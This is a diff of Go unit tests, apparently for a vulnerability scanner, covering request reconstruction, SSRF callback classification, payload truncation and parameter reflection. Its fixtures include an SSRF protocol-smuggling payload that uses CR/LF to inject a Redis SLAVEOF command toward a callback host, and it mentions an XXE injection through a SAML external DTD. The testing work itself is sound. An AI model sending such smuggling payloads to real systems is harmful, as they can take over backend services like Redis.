@@ -221,15 +221,41 @@ func TestPayloadRequest(t *testing.T) {
 		t.Errorf("header reconstruction missing payload: %q", hdr)
 	}
 
-	// Parameter injection is not reconstructed (the wire form is unknown) — the
-	// original request is returned unchanged.
+	// Parameter injection with NO recorded payload is not reconstructed (the wire
+	// form is unknown) — the original request is returned unchanged.
 	param := payloadRequest(raw, PayloadContext{
 		ParameterName: "url",
 		InjectionType: "parameter",
 		CallbackURL:   "abc123.oast.vigolium.com",
 	}, "http")
 	if param != string(raw) {
-		t.Errorf("parameter injection should return original request, got: %q", param)
+		t.Errorf("parameter injection without payload should return original request, got: %q", param)
+	}
+
+	// Parameter injection WITH a recorded payload → the value is re-applied at the
+	// named query parameter using the real builder, so the Request panel shows the
+	// exact wire form (the smuggle payload's literal CR/LF query-encoded, the benign
+	// crawl value replaced) instead of the untouched original request.
+	smuggleReq := []byte("GET /login?refURL=https%3A%2F%2Fvictim.example%2Fhome HTTP/1.1\r\nHost: victim.example\r\n\r\n")
+	rebuilt := payloadRequest(smuggleReq, PayloadContext{
+		ParameterName: "refURL",
+		InjectionType: "ssrf-smuggle:redis-slaveof",
+		CallbackURL:   "abc123.oast.vigolium.com",
+		Payload:       "http://abc123.oast.vigolium.com:6379/\r\nSLAVEOF vigolium.oast 0\r\n",
+	}, "dns")
+	if !strings.Contains(rebuilt, "abc123.oast.vigolium.com") {
+		t.Errorf("param reconstruction must show the callback host: %q", rebuilt)
+	}
+	if strings.Contains(rebuilt, "victim.example%2Fhome") {
+		t.Errorf("param reconstruction must replace the benign crawl value: %q", rebuilt)
+	}
+	if !strings.Contains(rebuilt, "Host: victim.example") {
+		t.Errorf("param reconstruction must preserve headers: %q", rebuilt)
+	}
+	// The literal CR/LF carried by the smuggle payload must be query-encoded, not
+	// spliced in as real bytes that would forge extra request lines/headers.
+	if strings.Contains(rebuilt, "SLAVEOF vigolium.oast 0\r\n") {
+		t.Errorf("param reconstruction must query-encode the payload's CR/LF, got raw: %q", rebuilt)
 	}
 
 	// When the planting module recorded the exact value (PayloadContext.Payload),
@@ -285,6 +311,22 @@ func TestDescribeInjectedPayload(t *testing.T) {
 	}
 	if !strings.Contains(smuggle, `\r\n`) || !strings.Contains(smuggle, "(parameter url)") {
 		t.Errorf("smuggle anchor should escape CR/LF and keep the location: %q", smuggle)
+	}
+
+	// A large recorded payload (e.g. a re-encoded SAML assertion carrying an XXE DTD)
+	// must be truncated on its one-line anchor with a byte-count suffix so it can't
+	// balloon to kilobytes; the injection location is still preserved.
+	big := describeInjectedPayload(PayloadContext{
+		ParameterName: "SAMLResponse",
+		InjectionType: "XXE (SAML external DTD)",
+		CallbackURL:   "abc123.oast.vigolium.com",
+		Payload:       strings.Repeat("QUJDRA", 2000), // ~12 KB of base64-ish text
+	}, "dns")
+	if len([]rune(big)) > maxAnchorPayloadLen+64 {
+		t.Errorf("large payload anchor should be truncated, got %d runes", len([]rune(big)))
+	}
+	if !strings.Contains(big, "bytes total)") || !strings.Contains(big, "(parameter SAMLResponse)") {
+		t.Errorf("truncated anchor should carry a byte-count suffix and the location: %q", big)
 	}
 }
 
@@ -716,6 +758,56 @@ func TestClassifyInteractionHostRoutingInfo(t *testing.T) {
 	generic := PayloadContext{TargetURL: "http://target.com", InjectionType: "parameter", ParameterName: "url", ModuleID: "ssrf-detection"}
 	if sev, _, _ := classifyInteraction("http", generic); sev.String() != "high" {
 		t.Errorf("generic SSRF classifyInteraction severity = %s, want high", sev)
+	}
+}
+
+// TestClassifyInteractionSmuggleDNS verifies a DNS-only SSRF protocol-smuggling
+// callback is reported as an explicitly-unconfirmed lead (DNS cannot evidence
+// cross-protocol smuggling), while the HTTP leg stays a real outbound-fetch signal.
+func TestClassifyInteractionSmuggleDNS(t *testing.T) {
+	pctx := PayloadContext{
+		TargetURL:     "https://target.com/login?refURL=x",
+		InjectionType: "ssrf-smuggle:redis-slaveof",
+		ParameterName: "refURL",
+		ModuleID:      "ssrf-protocol-smuggling",
+	}
+
+	sev, conf, desc := classifyInteraction("dns", pctx)
+	if sev != severity.Info || conf != severity.Tentative {
+		t.Fatalf("smuggle DNS want Info/Tentative, got %s/%s", sev, conf)
+	}
+	if !strings.Contains(strings.ToLower(desc), "cannot confirm cross-protocol smuggling") {
+		t.Errorf("smuggle DNS desc should explain DNS cannot confirm smuggling: %q", desc)
+	}
+
+	// The HTTP leg (an actual outbound fetch reached the collaborator) is not
+	// downgraded by the smuggle branch — it keeps the generic blind-SSRF rating.
+	if sev, _, _ := classifyInteraction("http", pctx); sev.String() != "high" {
+		t.Errorf("smuggle HTTP leg should stay high, got %s", sev)
+	}
+}
+
+// TestParamValueReflected verifies the harvested-reflected-URL signal: it fires when
+// the parameter's value is echoed in the response (encoded or decoded) and stays
+// quiet otherwise or for an unknown parameter.
+func TestParamValueReflected(t *testing.T) {
+	req := []byte("GET /login?refURL=https%3A%2F%2Fvictim.example%2Fhome HTTP/1.1\r\nHost: victim.example\r\n\r\n")
+
+	// Response echoes the URL-decoded value (the classic reflected-URL case).
+	respReflect := []byte("HTTP/1.1 200 OK\r\n\r\n<script>var u=\"https://victim.example/home\";</script>")
+	if !paramValueReflected(req, respReflect, "refURL") {
+		t.Errorf("expected reflection to be detected when the decoded value is echoed")
+	}
+
+	// No reflection → false.
+	respNo := []byte("HTTP/1.1 200 OK\r\n\r\n<html>nothing echoed here</html>")
+	if paramValueReflected(req, respNo, "refURL") {
+		t.Errorf("did not expect reflection when the value is absent")
+	}
+
+	// Unknown parameter name → false (no insertion point matches).
+	if paramValueReflected(req, respReflect, "nope") {
+		t.Errorf("unknown parameter must not report reflection")
 	}
 }
 
